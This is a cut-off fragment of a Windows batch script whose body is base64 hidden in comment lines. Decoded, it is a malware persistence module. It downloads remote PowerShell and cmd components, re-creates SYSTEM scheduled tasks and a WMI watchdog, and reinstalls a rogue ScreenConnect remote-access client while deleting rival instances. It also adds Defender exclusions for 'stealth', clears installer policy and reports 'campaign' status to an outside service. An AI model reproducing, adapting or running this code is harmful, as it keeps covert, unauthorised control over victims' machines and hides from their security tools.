::WZpbmVkIE1PX0Igc2V0ICJNT19CPTMiDQoNCnJlbSDilIDilIAgW0FdIGF1dG8tdXBkYXRlIGNv
::cmUgZmlsZXMgKGJlc3QgZWZmb3J0KSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilID
::ilIDilIDilIDilIDilIDilIDilIANCmlmIG5vdCBleGlzdCAiJUNVUkwlIiBzZXQgIkNVUkw9Y3
::VybC5leGUiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgO
::CAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjEN
::CmlmIG5vdCBleGlzdCAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3Q
::tdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVURzIlIi
::A+bnVsIDI+JjENCmZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXciKSBkbyBpZiAlJX56R
::iBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5w
::czEiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1
::lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVPV05TRUMlIi
::A+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVDVVJMJSIgL
::UwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUu
::bmV3IiAiJU9XTlNFQzIlIiA+bnVsIDI+JjENCmZvciAlJUYgaW4gKCIlV0QlXG93bl9zZWN1cmU
::ubmV3IikgZG8gaWYgJSV+ekYgR1RSIDgwMCBtb3ZlIC95ICIlV0QlXG93bl9zZWN1cmUubmV3Ii
::AiJVdEJVxvd25fc2VjdXJlLmNtZCIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZ
::XZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIu
::bmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIubmV
::3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRC
::Vcb3duX2xpYi5uZXciICIlT1dOTElCMiUiID5udWwgMj4mMQ0KZm9yICUlRiBpbiAoIiVXRCVcb
::3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXG93bl9saWIu
::bmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQpyZW0gc2VsZi11cGRhdGU6IGRvd25
::sb2FkIG5ldyBvd25fbW9uLCBhcHBseSBBRlRFUiB0aGlzIHRpY2sNCnNldCAiU0VMRl9VUEQ9MC
::INCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4L
::XRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9XTk1PTiUiID5udWwgMj4mMQ0KaWYg
::bm90IGV4aXN0ICIlV0QlXG93bl9tb24ubmV4dCIgIiVDVVJMJSIgLUwgLS1jb25uZWN0LXRpbWV
::vdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04yJSIgPm
::51bCAyPiYxDQpmb3IgJSVGIGluICgiJVdEJVxvd25fbW9uLm5leHQiKSBkbyBpZiAlJX56RiBHV
::FIgMTUwMCAoDQogIGZjIC9iICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3duX21vbi5jbWQi
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgc2V0ICJTRUxGX1VQRD0xIg0KKQ0KDQpyZW0
::g4pSA4pSAIFtCXSByZS1hcm0gY2hhaW4gMSAoc2NodGFza3MpIGlmIG1pc3Npbmcg4pSA4pSA4p
::SA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpzY2h0YXNrc
::yAvUXVlcnkgL1ROICIlVEFTS19BJSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBl
::Y2hvIHJlYXJtIFRBU0tfQSAlVEFTS19BJT4+IiVMT0clIg0KICBzY2h0YXNrcyAvQ3JlYXRlIC9
::GIC9UTiAiJVRBU0tfQSUiIC9TQyBNSU5VVEUgL01PICVNT19BJSAvUlUgU1lTVEVNIC9STCBISU
::dIRVNUIC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQ0KICBzY2h0YXNrc
::yAvUnVuIC9UTiAiJVRBU0tfQSUiID5udWwgMj4mMQ0KKQ0Kc2NodGFza3MgL1F1ZXJ5IC9UTiAi
::JVRBU0tfQiUiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyByZWFybSBUQVN
::LX0IgJVRBU0tfQiU+PiIlTE9HJSINCiAgc2NodGFza3MgL0NyZWF0ZSAvRiAvVE4gIiVUQVNLX0
::IlIiAvU0MgTUlOVVRFIC9NTyAlTU9fQiUgL1JVIFNZU1RFTSAvUkwgSElHSEVTVCAvVFIgImNtZ
::CAvYyAlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgc2NodGFza3MgL1J1biAvVE4gIiVU
::QVNLX0IlIiA+bnVsIDI+JjENCikNCnNjaHRhc2tzIC9RdWVyeSAvVE4gIiVUQVNLX0MlIiA+bnV
::sIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8gcmVhcm0gVEFTS19DICVUQVNLX0MlPj
::4iJUxPRyUiDQogIHNjaHRhc2tzIC9DcmVhdGUgL0YgL1ROICIlVEFTS19DJSIgL1NDIE9OU1RBU
::lQgL1JVIFNZU1RFTSAvUkwgSElHSEVTVCAvVFIgImNtZCAvYyAlV0QlXG93bl9tb24uY21kIiA+
::bnVsIDI+JjENCikNCnNjaHRhc2tzIC9RdWVyeSAvVE4gIiVUQVNLX0QlIiA+bnVsIDI+JjENCml
::mIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8gcmVhcm0gVEFTS19EICVUQVNLX0QlPj4iJUxPRyUiDQ
::ogIHNjaHRhc2tzIC9DcmVhdGUgL0YgL1ROICIlVEFTS19EJSIgL1NDIE9OTE9HT04gL1JMIEhJR
::0hFU1QgL1RSICJjbWQgL2MgJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQopDQoNCnJlbSDi
::lIDilIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikgaWYgbWlzc2luZyD
::ilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIi
::AoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qc
::m9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
::JVxvd25fbGliLnBzMSIgLUFjdGlvbiB3YXRjaGRvZy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1
::Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvIHNldCAiV0RfU1RBVEU9JSVSIg0KICBpZi
::AvSSAiIVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVEPj4iJ
::UxPRyUiDQopDQoNCnJlbSDilIDilIAgW0NdIGhlYWwgU2NyZWVuQ29ubmVjdCBwcmltL2FsdCDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilID
::ilIDilIDilIDilIDilIDilIDilIDilIDilIANCmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KC
::kiICUlYSBpbiAoJ3NjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgX
::nwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FIicpIGRvICgNCiAgc2V0IC9hIENPVU5UKz0xDQog
::IHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTVNUQVRFPSUlYiINCikNCnNjIHF1ZXJ5ICJ
::TY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQ
::ppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIg0KZm9yIC9mICJ0b2tlbnM9MSwyI
::GRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxU
::X0ZQJSkiIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRSInKSBkbyBzZXQgL2EgQ09VTlQrPTE
::NCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk
::5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRfT0s9MSINCg0KaWYgIiVJT
::lNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBlY2hvIHN2YyBoZWFsIHJl
::c3RhcnQ+PiIlTE9HJSINCiAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVB
::fRlAlKSIgPm51bCAyPiYxDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRV
::BfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0I
::CJQUklNX09LPTEiDQopDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9PSIw
::IiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblB
::vbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcm
::tEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInN2Yy13b250LXN0YXJ0IiA+bnVsI
::DI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJTY3JlZW5Db25uZWN0ICglS0VFUF9GUCUpIGlu
::c3RhbGxlZCBidXQgd29udCBzdGFydCINCiAgZ290byA6Rm9yZWlnbkNoZWNrDQopDQppZiAiJUl
::OU1RBTExFRCUiPT0iMSIgZ290byA6Rm9yZWlnbkNoZWNrDQoNCnJlbSDilIDilIAgW0RdIHByaW
::1hcnkgU0MgbWlzc2luZyAtIGZ1bGwgcmVpbnN0YWxsIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUg
::OKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZWNobyBzdmMgbWlzc2luZyAtIHJl
::aW5zdGFsbGluZz4+IiVMT0clIg0KY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiI
::NCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzE/dD0lUk
::FORE9NJSIgImdpdGh1Yi1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsb
::E1zaSAiJU1TSV9QS0cyJSIgImpzZGVsaXZyLXBrZyINCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAo
::DQogIGZvciAlJUYgaW4gKCIlTVNJJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICB
::lY2hvIGNhY2hlIHJldHJ5IGluc3RhbGw+PiIlTE9HJSINCiAgICBjYWxsIDpOb01zaVBvbGljeQ
::0KICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCAvTCp2ICIlV0QlXG1zaV9oZ
::WFsLmxvZyIgPm51bCAyPiYxDQogICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICBl
::Y2hvIGNhY2hlIG1zaWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCiAgICBjYWxsIDpXYWl
::0U3ZjDQogICkNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoDQogIGlmIGV4aXN0ICIlV0QlXG
::1zaV9oZWFsLmxvZyIgKA0KICAgIGVjaG8gLS0tIG1zaV9oZWFsLmxvZyB0YWlsIC0tLT4+IiVMT
::0clIg0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQg
::IkdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAnJVdEJVxtc2lfaGVhbC5sb2cnIC1UYWlsIDEwIiA
::+PiIlTE9HJSIgMj4mMQ0KICApDQogIGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWE
::lUPWZldGNoLWZhaWwiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgL
::UV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
::c3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgIm1zaS1mYWlsZWQ
::iID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbi
::BhbGwgc291cmNlcyAobXNpZXhlYyBleGl0ICVNU0lFWElUJSkiDQopIGVsc2UgKA0KICBlY2hvI
::HN2YyByZXN0b3JlZD4+IiVMT0clIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiA
::tQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZX
::N0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY
::3QgcmVpbnN0YWxsZWQgT0siDQopDQoNCjpGb3JlaWduQ2hlY2sNCnJlbSDilIDilIAgW0VdIG51
::a2UgZm9yZWlnbiBTQyBzZXJ2aWNlcyArIGRpcnMgKG5ldmVyIHRvdWNoIGFsbG93bGlzdCkg4pS
::A4pSADQpmb3IgL2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdG
::VePSBhbGwgXnwgZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVud
::CInKSBkbyAoDQogIHNldCAiRlA9JSVhIg0KICBzZXQgIkZQPSFGUDogPSEiDQogIHNldCAvYSBD
::T1VOVCs9MQ0KICBpZiAvSSBub3QgIiFGUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFGUCE
::iPT0iJUFMVF9GUCUiICgNCiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xDQogICAgc2V0ICJGT1
::JFSUdOX0xJU1Q9IUZPUkVJR05fTElTVCEhRlAhICINCiAgICBzYyBzdG9wICJTY3JlZW5Db25uZ
::WN0IENsaWVudCAoIUZQISkiID5udWwgMj4mMQ0KICAgIHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVj
::dCBDbGllbnQgKCFGUCEpIiA+bnVsIDI+JjENCiAgICBlY2hvIG51a2VfZm9yZWlnbl9zdmNfIUZ
::QIT4+IiVMT0clIg0KICApDQopDQppZiBleGlzdCAiJVBGODYlIiBmb3IgL2QgJSVEIGluICgiJV
::BGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICgqKSIpIGRvICgNCiAgc2V0ICJETj0lJX5ueEQiD
::QogIHNldCAiREZQPSFETjpTY3JlZW5Db25uZWN0IENsaWVudCAoPSEiDQogIHNldCAiREZQPSFE
::RlA6KT0hIg0KICBpZiAvSSBub3QgIiFERlAhIj09IiVLRUVQX0ZQISIgaWYgL0kgbm90ICIhREZ
::QISI9PSIlQUxUX0ZQISIgKA0KICAgIHJtZGlyIC9zIC9xICIlJUQiID5udWwgMj4mMQ0KICAgIG
::lmIG5vdCBleGlzdCAiJSVEIiAoZWNobyBudWtlX2ZvcmVpZ25fZGlyXyFERlAhPj4iJUxPRyUiK
::SBlbHNlIChlY2hvIG51a2VfZGlyX2ZhaWxlZF8hREZQIT4+IiVMT0clIikNCiAgKQ0KKQ0KDQpy
::ZW0g4pSA4pSAIFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9
::uIHJlZnJlc2gpIOKUgOKUgA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZS
::AtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAidHJ5IHsgQWRkLU1wUHJlZmVyZW5jZ
::SAtRXhjbHVzaW9uUGF0aCAnJVdEJScsJyVFVEwlJyAtRXJyb3JBY3Rpb24gU3RvcCB9IGNhdGNo
::IHt9IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1zZWN1cmU
::gZXZlcnkgfjIgaCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilI
::DilIDilIDilIDilIDilIANCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgL
::UNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVXRCVcb3duX3NlY3VyZS5jbWQnKSAtYW5kICgoIC1u
::b3QgKFRlc3QtUGF0aCAnJVdEJVxzZWMuZmxhZycpKSAtb3IgKCgoR2V0LURhdGUpIC0gKEdldC1
::JdGVtIC1MaXRlcmFsUGF0aCAnJVdEJVxzZWMuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsSG
::91cnMgLWdlIDIpKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQppZiBlc
::nJvcmxldmVsIDEgKA0KICBlY2hvIHBlcmlvZGljIHJlLXNlY3VyZT4+IiVMT0clIg0KICBjYWxs
::ICIlV0QlXG93bl9zZWN1cmUuY21kIiA+PiIlTE9HJSIgMj4mMQ0KICBlY2hvIGRvbmU+IiVXRCV
::cc2VjLmZsYWciDQopDQoNCnJlbSDilIDilIAgW0hdIGNhbXBhaWduIHN0YXRlICsgaG91cmx5IG
::NvbXBhY3QgZGlnZXN0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUg
::OKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmls
::ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3d
::uX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJS
::A+bnVsIDI+JjENCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hb
::mQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAoTmV3LVRpbWVTcGFuIC1TdGFydCAo
::R2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFHJScpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWl
::udXRlcyAtbHQgNjApeyBleGl0IDAgfSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4mMQ0KaWYgZX
::Jyb3JsZXZlbCAxICgNCiAgZWNobyBoYj4lSEJGTEFHJQ0KICBwb3dlcnNoZWxsIC1Ob1Byb2Zpb
::GUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRn
::X3JlcG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1CdWlsZCAlTU9OVkVSJSAtQ29
::1bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgZWNobyBkaWdlc3QgSEIgc2VudD4+IiVMT0clIg0KKQ
::0KDQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlzIHRpY
::2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgIiVTRUxG
::X1VQRCUiPT0iMSIgKA0KICBlY2hvIHNlbGYtdXBkYXRlIGFwcGx5Pj4iJUxPRyUiDQogIG1vdmU
::gL3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQopDQ
::oNCmVjaG8gdGljayBkb25lOiBwcmltPSVQUklNX09LJSBhbHQ9JUFMVF9PSyUgZm9yZWlnbj0lR
::k9SRUlHTl9MRUZUJT4+IiVMT0clIg0KZW5kbG9jYWwNCmV4aXQgL2IgMA0KDQpyZW0g4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIGhlbHBlcnMg4pWQ4pWQ4pW
::Q4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQo6SW5zdGFsbE1zaQ0KcmVtIC
::UxPXVybCAlMj10YWcNCnNldCAiVVJMPSV+MSINCnNldCAiVEFHPSV+MiINCmVjaG8gWyVUQUclX
::SBmZXRjaCAlVVJMJT4+IiVMT0clIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29u
::bmVjdC10aW1lb3V0IDI1IC0tbWF4LXRpbWUgMzAwIC1vICIlTVNJJS50bXAiICIlVVJMJSIgPj4
::iJUxPRyUiIDI+JjENCmZvciAlJUYgaW4gKCIlTVNJJS50bXAiKSBkbyBpZiAlJX56RiBMRVEgMT
::AwMDAwMCAoDQogIGVjaG8gWyVUQUclXSBmZXRjaCBmYWlsZWQ+PiIlTE9HJSINCiAgZGVsIC9mI
::C9xICIlTVNJJS50bXAiID5udWwgMj4mMQ0KICBleGl0IC9iIDENCikNCm1vdmUgL3kgIiVNU0kl
::LnRtcCIgIiVNU0klIiA+bnVsIDI+JjENCmNhbGwgOk5vTXNpUG9saWN5DQplY2hvIFslVEFHJV0
::gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiDQptc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3
::RhcnQgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0Kc2V0ICJNU0lFWElUPSVFU
::lJPUkxFVkVMJSINCmVjaG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9JU1TSUVYSVQlPj4iJUxPRyUi
::DQpjYWxsIDpXYWl0U3ZjDQpleGl0IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJ
::IS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRG
::lzYWJsZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZ
::XNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4m
::MQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN
::0YWxsZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleG
::l0IC9iIDANCg0KOldhaXRTdmMNCnNldCAiVFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkgI
::lNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
::CmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1
::fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQgL2EgVFJJRVMrPTENCmlmICVUUklFUyUgR0VRID
::EwIGV4aXQgL2IgMQ0KcGluZyAxMjcuMC4wLjEgLW4gNyA+bnVsIDI+JjENCmdvdG8gOldhaXRMb
::29wDQoNCjpUZ1N0YXRlDQpzZXQgIk5FV1NUQVRFPSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAi
::T0xEU1RBVEU9Ig0KaWYgZXhpc3QgIiVTVEFURSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFURSU
::iDQpyZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0IHBlciAzMC
::BtaW4gd2hpbGUgc3R1Y2sNCmlmIC9JICIlTkVXU1RBVEUlIj09IkRPV04iIGdvdG8gOk1heWJlU
::3VwcHJlc3MNCmlmIC9JICIlTkVXU1RBVEUlIj09IkZBSUwiIGdvdG8gOk1heWJlU3VwcHJlc3MN
::CmdvdG8gOlNlbmRBbGVydA0KOk1heWJlU3VwcHJlc3MNCmlmIC9JICIlTkVXU1RBVEUlIj09IiV
::PTERTVEFURSUiIGlmIGV4aXN0ICIlV0QlXHRnX3NlbnQuZmxhZyIgKA0KICBwb3dlcnNoZWxsIC
::1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1Td
::GFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0
::ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4
::mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3N1cHByZXNzZWRfJU5FV1
::NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6U2VuZEFsZXJ0DQplY2hvI
::CVORVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfc2VudC5mbGFnIg0KcG93
::ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGF
::zcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeS
::AiJU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gd
::Gcgc3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM0IC0gaWRlbnRpdHktYXd
::hcmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTA0Kc2
::V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhwYW5zaW9uDQpzZXQgIldEP
::SVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQg
::IldEMj0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0
::Kc2V0ICJMT0c9JVdEJVxib290LmVyciINCnNldCAiUFJJTT1TY3JlZW5Db25uZWN0IENsaWVudC
::AoNWY2MDEwNTc5ODUyZTUwNykiDQpzZXQgIkFMVD1TY3JlZW5Db25uZWN0IENsaWVudCAoZjg2M
::WM4MTQwZDQ1MzQyNykiDQpzZXQgIktFRVAxPTVmNjAxMDU3OTg1MmU1MDciDQpzZXQgIktFRVAy
::PWY4NjFjODE0MGQ0NTM0MjciDQpzZXQgIlBGPSVQcm9ncmFtRmlsZXMlIg0Kc2V0ICJQRjg2PSV
::Qcm9ncmFtRmlsZXMoeDg2KSUiDQpzZXQgIlRBU0tST09UPSVTeXN0ZW1Sb290JVxTeXN0ZW0zMl
